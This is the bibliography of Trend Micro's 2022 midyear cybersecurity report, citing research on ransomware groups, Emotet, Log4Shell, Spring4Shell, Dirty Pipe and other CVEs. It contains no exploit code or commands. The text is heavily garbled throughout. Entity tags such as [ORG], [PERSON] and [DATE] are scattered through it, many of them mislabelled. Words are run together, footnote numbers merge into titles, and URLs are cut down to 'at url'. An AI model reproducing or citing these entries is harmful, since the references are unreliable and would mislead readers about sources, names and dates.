\u201c [WORK_OF_ART] Mapping [WORK_OF_ART] the [WORK_OF_ART] Digital [WORK_OF_ART] Attack [WORK_OF_ART] Surface : [WORK_OF_ART] Why [WORK_OF_ART] global [WORK_OF_ART] organisations are struggling to managecyber risk . \u201d Accessed on [DATE] July [DATE] 22 , [DATE] 2022 , at url of - man?_ga=2.73724434.1298314925.1653919723 - 176640189.1651078671.2Joseph C Chen et al . ( [DATE] Jan. [DATE] 17 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Delving [WORK_OF_ART] Deep : [WORK_OF_ART] An [WORK_OF_ART] Analysis [WORK_OF_ART] of [WORK_OF_ART] Earth [WORK_OF_ART] Lusca \u2019s [WORK_OF_ART] Operations . \u201d Accessed on [DATE] July [DATE] 22 , [DATE] 2022 , at url sophisticated - infrastructure - varied - tools - and - techniques / technical - brief - delving - deep - an - analysis - of - earth - lusca - operations . [ORG] pdf.3 [ORG] Daniel [ORG] Lunghi and [PERSON] Jaromir [PERSON] Horejsi . ( [DATE] April [DATE] 27 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Operation Earth Berberoka : An Analysis of a Multivector and [ORG] Multiplatform [ORG] APT [ORG] Campaign [ORG] Targeting [ORG] Online [ORG] Gambling [ORG] Sites . \u201d Accessed on [DATE] July [DATE] 22 , [DATE] 2022 , at url com / assets / white_papers / wp - operation - earth - berberoka.pdf.4 [PERSON] Aliakbar [PERSON] Zahravi and [ORG] Leandro [ORG] Froes . ( [DATE] May [DATE] 5 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] NetDooka [ORG] Framework [ORG] Distributed via [ORG] PrivateLoaderMalware as Part of Pay - Per - Install Service . \u201d Accessed on [DATE] July [DATE] 22 , [DATE] 2022 , at url netdooka - framework - distributed - via - privateloader - ppi.html.5Intel471 . ( [DATE] Feb. 8 , [DATE] 2022 ) . [ORG] Intel471 . \u201c PrivateLoader : The [ORDINAL] first step in many malware schemes . \u201d Accessed on [DATE] July [DATE] 22 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 7 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Toward [WORK_OF_ART] a [WORK_OF_ART] New Momentum : [ORG] Trend [ORG] Micro [ORG] Security [ORG] Predictions for [DATE] 2022 . \u201d [GPE] Accessedon [DATE] July [DATE] 22 , [DATE] 2022 , at url predictions - for-2022.pdf.7 Europol . ( n.d . ) . [ORG] Europol . \u201c World \u2019s most dangerous malware EMOTET disrupted through global action . \u201d Accessed on July22 , 2022 , at url emotet - disrupted - through - global - action.8 [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 7 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Malware [WORK_OF_ART] Awareness \u2013 EMOTET resurges with new detections . \u201d Accessed on [DATE] July [DATE] 22 , [DATE] 2022 , at url US&_ga=2.30145279.1991401181.1657506653 - 177026311.1643353537.9 [PERSON] Yelisey [PERSON] Boguslavskiy and [PERSON] Vitali [PERSON] Kremez . ( [DATE] Dec. [DATE] 10 , [DATE] 2021 ) . [ORG] Advintel . \u201c [WORK_OF_ART] Corporate [WORK_OF_ART] Loader \u2018 [WORK_OF_ART] Emotet \u2019 : [WORK_OF_ART] History [WORK_OF_ART] of \u2018 X \u2019 [WORK_OF_ART] Project [WORK_OF_ART] Return [WORK_OF_ART] for [WORK_OF_ART] Ransomware . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url return - for - ransomware.10 [ORG] Adolph [ORG] Christian Silverio et al . ( [DATE] May 19 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Bruised [WORK_OF_ART] but [WORK_OF_ART] Not Broken : [WORK_OF_ART] The [WORK_OF_ART] Resurgence [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] Emotet [WORK_OF_ART] BotnetMalware . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url resurgence - of - the - emotet - botnet - malw.html.11 Trend Micro . ( [DATE] March [DATE] 3 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Cyberattacks are Prominent in the Russia - Ukraine Conflict . \u201d Accessed on [DATE] July [DATE] 25,2022 , at url [PERSON] Trustwave . ( [DATE] April [DATE] 29 , [DATE] 2022 ) . Trustwave . \u201c Stormous : The Pro - [NORP] Russian , Clout Hungry Ransomware Gang Targets the [GPE] US and [GPE] Ukraine . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url pro - russian - clout - hungry - ransomware - gang - targets - the - us - and - ukraine/.13 Palo Alto Networks . ( [DATE] Feb. [DATE] 25 , [DATE] 2022 ) . Unit [CARDINAL] 42 . \u201c Spear Phishing Attacks Target Organizations in [GPE] Ukraine , Payloads Include theDocument Stealer OutSteel and the Downloader SaintBot . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url com / ukraine - targeted - outsteel - [ORG] saintbot/.14 [ORG] Trend [ORG] Micro . ( [DATE] March [DATE] 3 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Cyberattacks are Prominent in the Russia - Ukraine Conflict . \u201d Accessed on [DATE] July [DATE] 25,2022 , at url [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Apache [WORK_OF_ART] Log4j [WORK_OF_ART] ( Log4Shell ) Vulnerability . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url [PERSON] Carmella [PERSON] Chirinos . ( [DATE] April [DATE] 12 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Anonymous vows to continue cyber war against Putin \u2019s [GPE] Russia untilaggression in [GPE] Ukraine stops . \u201d Accessed on [DATE] July 28 , [DATE] 2022 , at url ukraine/.44 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity Report17 [PERSON] Miguel [PERSON] Carlo [PERSON] Ang and [ORG] Earle [ORG] Maui [ORG] Earnshaw . ( [DATE] Oct. [DATE] 25 , [DATE] 2019 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] Negasteal / Agent Tesla , Ave [PERSON] Maria [PERSON] Delivered [PERSON] viaMalspam . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url tesla - ave - maria - delivered - via - malspam.html.18 [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro . \u201c Ransomware as a Service ( RaaS ) . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] May [DATE] 23 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Lockbit , [PERSON] Conti , and [ORG] BlackCat , [PERSON] Lead [PERSON] Pack [PERSON] Amid [PERSON] Rise in Active RaaS and [PERSON] Extortion [PERSON] Groups . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url lockbit - conti - and - blackcat - lead - pack - amid - rise - in - active - raas - and - extortion - groups - ransomware - in - q1 - [CARDINAL] 2022.20 [ORG] Trend [ORG] Micro . ( [DATE] Feb. 8 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [PERSON] Ransomware [PERSON] Spotlight : [ORG] LockBit . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url [PERSON] Lisa [PERSON] Vaas . ( [DATE] Aug. 11 , [DATE] 2021 ) . [ORG] Threat [ORG] Post . \u201c [WORK_OF_ART] Accenture [WORK_OF_ART] Confirms [WORK_OF_ART] LockBit [PERSON] Ransomware [PERSON] Attack . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , aturl [ORG] Trend [ORG] Micro . ( [DATE] Sept. 24 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Addressing [WORK_OF_ART] Threats [WORK_OF_ART] Like [WORK_OF_ART] Ryuk [WORK_OF_ART] via [ORG] Trend [ORG] Micro [ORG] XDR . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url micro - xdr.23 [ORG] Radio [ORG] New [ORG] Zealand . ( [DATE] May [DATE] 18 , [DATE] 2021 ) . [ORG] Radio [ORG] New [ORG] Zealand . \u201c [PERSON] Waikato hospitals hit by cyber security incident . \u201d Accessed on July25 , [DATE] 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2018 - 13379 . \u201d Accessed on July25 , [DATE] 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2018 - 13374 . \u201d Accessed on July25 , [DATE] 2022 , at url [PERSON] Lawrence [PERSON] Abrams . ( [DATE] Sept. [DATE] 21 , [DATE] 2021 ) . Bleeping Computer . \u201c [PERSON] Conti ransomware now hacking [ORG] Exchange servers with [ORG] ProxyShell exploits . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url exchange - servers - with - proxyshell - exploits/.27 Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2020 - 1472 . \u201d Accessed on July25 , [DATE] 2022 , at url [PERSON] Monica [PERSON] Buchanan [PERSON] Pitrelli . ( [DATE] April [DATE] 13 , [DATE] 2022 ) . [ORG] CNBC . \u201c Leaked documents show notorious ransomware group has an HR department , performance reviews and an \u2018 employee of [DATE] the month \u2019 . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url com/2022/04/14 / conti - ransomware - leak - shows - group - operates - like - normal - tech - company.html.29 [PERSON] Pierluigi [PERSON] Paganini . ( [DATE] Dec. [DATE] 10 , [DATE] 2021 ) . [ORG] Security [ORG] Affairs . \u201c [ORG] BlackCat ransomware , a very sophisticated malware written in Rust . \u201dAccessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url [ORG] Amanda [ORG] Tanner et al . ( [DATE] Jan. [DATE] 27 , [DATE] 2022 ) . Unit [CARDINAL] 42 . \u201c Threat Assessment : BlackCat Ransomware . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , aturl [PERSON] Common [PERSON] Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2021 - 31207 . \u201d Accessed on July25 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] May [DATE] 23 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Lockbit , [PERSON] Conti , and [ORG] BlackCat , [PERSON] Lead [PERSON] Pack [PERSON] Amid [PERSON] Rise in Active RaaS and [PERSON] Extortion [PERSON] Groups . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url lockbit - conti - and - blackcat - lead - pack - amid - rise - in - active - raas - and - extortion - groups - ransomware - in - q1 - 2022.33 Fortune Business Insights . ( [DATE] May [DATE] 2022 ) . [WORK_OF_ART] Fortune [WORK_OF_ART] Business [WORK_OF_ART] Insights . \u201c [WORK_OF_ART] Linux [WORK_OF_ART] Operating [WORK_OF_ART] System [WORK_OF_ART] Market Size , [WORK_OF_ART] Share [WORK_OF_ART] & [WORK_OF_ART] COVID-19Impact [WORK_OF_ART] Analysis , By [ORG] Distribution [ORG] ( Virtual [ORG] Machines , [PERSON] Servers , and [ORG] Desktops ) , By End - use ( Commercial / Enterprise [ORG] and [ORG] Individual ) , And Regional Forecast , [DATE] 2022 - 2029 . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url linux - operating - system - market-103037.34 [ORG] Trend [ORG] Micro . ( [DATE] May [DATE] 17 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Ransomware Spotlight : RansomEXX . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url [ORG] Hugh [ORG] Aver . ( [DATE] March [DATE] 26 , [DATE] 2021 ) . [PERSON] Kaspersky . \u201c Ransomware in a virtual environment . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url [LAW] Arianne [LAW] Dela [LAW] Cruz et al . ( [DATE] May [DATE] 25 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] New [ORG] Linux - Based [ORG] Ransomware Cheerscrypt Targeting ESXi Devices Linked to [ORG] Leaked [ORG] Babuk [ORG] Source [ORG] Code . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url new - linux - based - ransomware - cheerscrypt - targets - exsi - devices.html.45 | Defending the Expanding Attack Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity Report37 [PERSON] Lawrence [PERSON] Abrams . ( [DATE] Sept. [DATE] 3 , [DATE] 2021 ) . Bleeping Computer . \u201c Babuk ransomware \u2019s full source code leaked on hacker forum . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url leaked - on - hacker - forum/.38 Ieriz [PERSON] Nicolle [PERSON] Gonzalez . ( [DATE] May [DATE] 9 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Examining the Black Basta Ransomware \u2019s Infection Routine . \u201d [GPE] Accessedon [DATE] July [DATE] 25 , [DATE] 2022 , at url routine.html.39 [ORG] Cybereason [ORG] Nocturnus . ( [DATE] June 24 , [DATE] 2022 ) . [PERSON] Cybereason . \u201c [PERSON] Cybereason vs. [PERSON] Black [PERSON] Basta [PERSON] Ransomware . \u201d Accessed on [DATE] July [DATE] 25,2022 , at url MalwareHunterTeam . ( [DATE] April [DATE] 27 , [DATE] 2022 , [TIME] 9:04 [TIME] p.m. ) Twitter . \u201c So this Black Basta ransomware \u2026 \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , aturl [GPE] Ieriz [PERSON] Nicolle [PERSON] Gonzalez . ( [DATE] May [DATE] 9 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c Examining the Black Basta Ransomware \u2019s Infection Routine . \u201d [GPE] Accessedon [DATE] July [DATE] 25 , [DATE] 2022 , at url routine.html.42 [ORG] HHS [ORG] Cybersecurity [ORG] Program . ( [DATE] April [DATE] 18 , [DATE] 2022 ) . [ORG] HHS [ORG] Cybersecurity [ORG] Program . \u201c [WORK_OF_ART] Hive [WORK_OF_ART] Ransomware . \u201d Accessed on [DATE] July [DATE] 25 , [CARDINAL] 2022,at url [WORK_OF_ART] Don [WORK_OF_ART] Ovid [WORK_OF_ART] Ladores [WORK_OF_ART] et [WORK_OF_ART] al . ( [DATE] March [DATE] 9 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] New [WORK_OF_ART] Nokoyawa [WORK_OF_ART] Ransomware [WORK_OF_ART] Possibly [WORK_OF_ART] Related [WORK_OF_ART] to [WORK_OF_ART] Hive . \u201d Accessed onJuly 25 , 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c Metrics . \u201d Accessed on [DATE] Aug. [DATE] 10 , [CARDINAL] 2022,at url#PublishedCVERecords.45 [ORG] Cybersecurity [ORG] & [ORG] Infrastructure [ORG] Security [ORG] Agency . ( n.d . ) . [ORG] Cybersecurity [ORG] & [ORG] Infrastructure [ORG] Security [ORG] Agency . \u201c [PRODUCT] Known [PRODUCT] ExploitedVulnerabilities [PRODUCT] Catalog . \u201d Accessed on [DATE] July 28 , [DATE] 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2017 - 14100 . \u201d Accessed on July25 , [DATE] 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c [PRODUCT] CVE- CVE-2022 - 30190 . \u201d [GPE] Accessedon [DATE] Aug. [DATE] 23 , [DATE] 2022 , at url Carly Page . ( [DATE] June [DATE] 1 , [DATE] 2022 ) . Tech Crunch . \u201c [GPE] China - backed hackers are exploiting unpatched [ORG] Microsoft zero - day . \u201d Accessed on ( [DATE] Aug. [DATE] 23 , [DATE] 2022 ) , at url [PERSON] Dustin [PERSON] Childs . ( [DATE] June [DATE] 14 , [DATE] 2022 ) . [DATE] Zero [DATE] Day [DATE] Initiative . \u201c The June 2022 [WORK_OF_ART] Security [WORK_OF_ART] Update [WORK_OF_ART] Review . \u201d Accessed on ( [DATE] Aug. [DATE] 23 , [DATE] 2022 ) , aturl [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Apache [WORK_OF_ART] Log4j [WORK_OF_ART] ( Log4Shell ) Vulnerability . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url [PERSON] Brian [PERSON] Barrett . ( [DATE] Dec. 16 , [DATE] 2021 ) . Wired . \u201c [WORK_OF_ART] The [WORK_OF_ART] Next [WORK_OF_ART] Wave [WORK_OF_ART] of [WORK_OF_ART] Log4J [WORK_OF_ART] Attacks [WORK_OF_ART] Will [WORK_OF_ART] Be [WORK_OF_ART] Brutal . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2022 - 22965 . \u201d Accessed on July25 , [DATE] 2022 , at url [PERSON] Deep [PERSON] Patel et al . ( [DATE] April 8 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c CVE-2022 - 22965 : Analyzing the Exploitation of Spring4Shell Vulnerability in Weaponizing and Executing the Mirai Botnet Malware . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url research/22 / d / cve-2022 - 22965 - analyzing - the - exploitation - of - spring4shell - vulner.html.54 Nitesh Surana and [PERSON] Ashish [PERSON] Verma . ( [DATE] April 20 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Analyzing [WORK_OF_ART] Attempts [WORK_OF_ART] to [WORK_OF_ART] Exploit the Spring4Shell VulnerabilityCVE-2022 - 22965 to Deploy Cryptocurrency Miners . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url research/22 / d / spring4shell - exploited - to - deploy - cryptocurrency - miners.html.55 Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2021 - 44142 . \u201d Accessed on July25 , [DATE] 2022 , at url Zero Day Initiative . ( [DATE] Feb. [DATE] 1 , [DATE] 2022 ) . [DATE] Zero [DATE] Day [DATE] Initiative . \u201c CVE-2021 - 44142 : Details on a Samba Code Execution BugDemonstrated at PWN2OWN [PERSON] Austin . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url [DATE] 2021 - 44142 - details - on - a - samba - code - execution - bug - demonstrated - at - pwn2own - austin.57 Samba . ( n.d . ) . Samba . \u201c [ORG] Samba [ORG] Security [ORG] Releases . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url | [WORK_OF_ART] Defending [WORK_OF_ART] the [WORK_OF_ART] Expanding [WORK_OF_ART] Attack [WORK_OF_ART] Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity Report58 Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2021 - 44228 . \u201d Accessed on Aug.1 , [DATE] 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2021 - 45046 . \u201d Accessed on Aug.1 , [DATE] 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2017 - 14495 . \u201d Accessed on Aug.1 , [DATE] 2022 , at url [GPE] Federico [GPE] Maggi . ( [DATE] Oct. [DATE] 9 , [DATE] 2017 ) . [ORG] Trend [ORG] Micro . \u201c [PERSON] Dnsmasq : A Reality Check and Remediation Practices . \u201d Accessed on [DATE] Aug. [DATE] 1,2022 , at url Real - Time [ORG] Innovations . ( n.d . ) . Real - Time [ORG] Innovations . \u201c DDS : An Open Standard for Real - Time Applications . \u201d Accessed on July25 , [DATE] 2022 , at url#:~:text = DDS%3A%20An%20Open%20Standard%20for , meet%20 real - time%20system%20requirements.63 Federico Maggi et al . ( [DATE] Jan. [DATE] 27 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] A [WORK_OF_ART] Security [WORK_OF_ART] Analysis [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] Data [WORK_OF_ART] Distribution [WORK_OF_ART] Service ( [ORG] DDS ) Protocol . \u201dAccessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url distribution - service - dds - protocol.pdf.64 [PERSON] Common [PERSON] Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2021 - 38447 . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url#:~:text = OCI%20OpenDDS%20versions%20 prior%20to , denial%2Dof%2Dservice%20condition.65 Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2021 - 38445 . \u201d Accessed on July25 , [DATE] 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2022 - 22639 . \u201d Accessed on July25 , [DATE] 2022 , at url [PERSON] Mickey [PERSON] Jin . ( [DATE] April [DATE] 4 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c MacOS [ORG] SUHelper [ORG] Root [ORG] Privilege [ORG] Escalation [ORG] Vulnerability : A Deep Dive Into CVE-2022 - 22639 . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url privilege - escalation - vulnerability - a - deep - di.html.68 Apple . ( [DATE] March [DATE] 14 , [DATE] 2022 ) . [ORG] Apple . \u201c About the security content of macOS Monterey 12.3 . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2022 - 0847 . \u201d Accessed on July25 , [DATE] 2022 , at url Sunil Bharti . ( [DATE] April [DATE] 6 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Detecting [WORK_OF_ART] Exploitation [WORK_OF_ART] of [WORK_OF_ART] Local [WORK_OF_ART] Vulnerabilities [WORK_OF_ART] Through [WORK_OF_ART] Trend [WORK_OF_ART] Micro [WORK_OF_ART] Vision [WORK_OF_ART] One \u2122 and Cloud One \u2122 . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url of - local - vulnerabilities - through - trend - mi.html.71 [ORG] Cybersecurity [ORG] & [ORG] Infrastructure [ORG] Security [ORG] Agency . ( [DATE] March [DATE] 10 , [DATE] 2022 ) . [ORG] Cybersecurity [ORG] & [ORG] Infrastructure [ORG] Security [ORG] Agency . \u201c [ORG] Dirty [ORG] Pipe [ORG] Privilege [ORG] Escalation [ORG] Vulnerability in Linux . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url activity/2022/03/10 / dirty - pipe - privilege - escalation - vulnerability - linux.72 Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2022 - 29464 . \u201d Accessed on July25 , [DATE] 2022 , at url hakivvi . ( [DATE] April [DATE] 25 , [DATE] 2022 ) . GitHub . \u201c CVE-2022 - 29464 / exploit.py . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url Orange Tsai et al . ( [DATE] May [DATE] 2 , [DATE] 2022 ) . Packet Storm Security . \u201c WSO Arbitrary File Upload / Remote Code Execution . \u201d Accessed onJuly 25 , 2022 , at url [GPE] Hitomi [GPE] Kimura et [PERSON] al . ( [DATE] May [DATE] 31 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Patch [WORK_OF_ART] Your [WORK_OF_ART] WSO2 : CVE-2022 - 29464 Exploited to [ORG] Install [ORG] Linux - CompatibleCobalt [ORG] Strike [ORG] Beacons , Other Malware . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url patch - your - wso2 - cve-2022 - 29464 - exploited - to - install - linux - compatible - cobalt - strike - beacons - other - malware.html.76 [WORK_OF_ART] WSO2 . ( [DATE] April [DATE] 29 , [DATE] 2022 ) . WSO2 . \u201c Security Advisory WSO2 - 2021 - 1738 . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url [PRODUCT] WSO2 . ( [DATE] April [DATE] 29 , [DATE] 2022 ) . WSO2 . \u201c Security Advisory WSO2 - 2021 - 1738 . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url | [WORK_OF_ART] Defending [WORK_OF_ART] the [WORK_OF_ART] Expanding [WORK_OF_ART] Attack [WORK_OF_ART] Surface : [ORG] Trend [ORG] Micro [ORG] 2022 Midyear Cybersecurity Report78 [ORG] Amazon [ORG] Web [ORG] Services . ( [DATE] June [DATE] 2020 ) . [ORG] Amazon [ORG] Web [ORG] Services . \u201c Cloud Value Benchmarking Study Quantifies the Benefits of Cloud Adoption . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url benchmarking - study - quantifies - cloud - adoption - benefits.pdf.79 Gartner . ( [DATE] April 19 , [DATE] 2022 ) . [PERSON] Gartner . \u201c [WORK_OF_ART] Gartner [WORK_OF_ART] Forecasts [WORK_OF_ART] Worldwide [WORK_OF_ART] Public [WORK_OF_ART] Cloud End - User [WORK_OF_ART] Spending to [ORG] Reach Nearly $ [MONEY] 500Billion in [DATE] 2022 . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url forecasts - worldwide - public - cloud - end - user - spending - to - reach - nearly-500 - billion - in-2022.80 [PERSON] Joanna [PERSON] Ossinger et [PERSON] al . ( [DATE] June 19 , [DATE] 2022 ) . Fortune . \u201c [PERSON] Bitcoin has extended its record - breaking decline to below $ 19,000.\u2018Although painful , removing the sector \u2019s froth is likely healthy , \u2019 one expert contends . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at https:// fortune.com/2022/06/18/bitcoin-has-extended-its-record-breaking-decline-to-below-19000-although-painful-removing-the- sectors - froth - is - likely - healthy - [CARDINAL] one - expert - contends/.81 Mayra Rosario Fuentes et al . ( [DATE] March [DATE] 29 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] A [WORK_OF_ART] Floating Battleground : [WORK_OF_ART] Navigating [WORK_OF_ART] the [WORK_OF_ART] Landscape [WORK_OF_ART] of [WORK_OF_ART] Cloud - Based [WORK_OF_ART] Cryptocurrency [WORK_OF_ART] Mining . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url navigating - the - landscape - of - cloud - based - cryptocurrency - mining.pdf.82 [ORG] Trend [ORG] Micro . ( [DATE] Nov. 19 , [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] Outlaw [ORG] Group [ORG] Distributes [ORG] Cryptocurrency - [ORG] Mining [ORG] Botnet . \u201d Accessed on July25 , [DATE] 2022 , at url scanning - and - brute - force.html.83 [PERSON] David [PERSON] Fiser and [PERSON] Alfredo [PERSON] Oliveira . ( [DATE] July 20 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Tracking [WORK_OF_ART] the [WORK_OF_ART] Activities [WORK_OF_ART] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor Group . \u201d Accessed on [DATE] July [DATE] 25 , [DATE] 2022 , at url tracking - the - activities - of - teamTNT.pdf.84 [PERSON] Jaromir [PERSON] Horejsi and [PERSON] David [PERSON] Fiser . ( [DATE] Nov. 24 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Analysis [WORK_OF_ART] of [WORK_OF_ART] Kinsing [WORK_OF_ART] Malware \u2019s [WORK_OF_ART] Use [WORK_OF_ART] of [WORK_OF_ART] Rootkit . \u201d Accessed onJuly 25 , 2022 , at url [PERSON] Lawrence [PERSON] Abrams . ( [DATE] Dec. [DATE] 12 , [DATE] 2021 ) . Bleeping Computer . \u201c Hackers start pushing malware in worldwide [PERSON] Log4Shell attacks . \u201dAccessed on [DATE] July [DATE] 26 , [DATE] 2022 , at url worldwide - log4shell - attacks/.86 Ryan Flores et al . ( [DATE] April [DATE] 26 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro . \u201c How Cybercriminals Abuse Cloud Tunneling Services . \u201d Accessed on July26 , [DATE] 2022 , at url cloud - tunneling - services.87 [PERSON] Aprilyn [PERSON] Borja et [PERSON] al . ( [DATE] Sept. [DATE] 14 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Analysis [WORK_OF_ART] of [WORK_OF_ART] a [WORK_OF_ART] Convoluted [WORK_OF_ART] Attack [WORK_OF_ART] Chain [WORK_OF_ART] Involving [WORK_OF_ART] Ngrok . \u201d Accessed on July26 , [DATE] 2022 , at url [ORG] Global [ORG] News [ORG] Wire . ( [DATE] May [DATE] 6 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Application Container Market is Expected to Reach $ [MONEY] 8.20 Billionby 2025 , Says [ORG] Allied [ORG] Market [ORG] Research . \u201d Accessed on 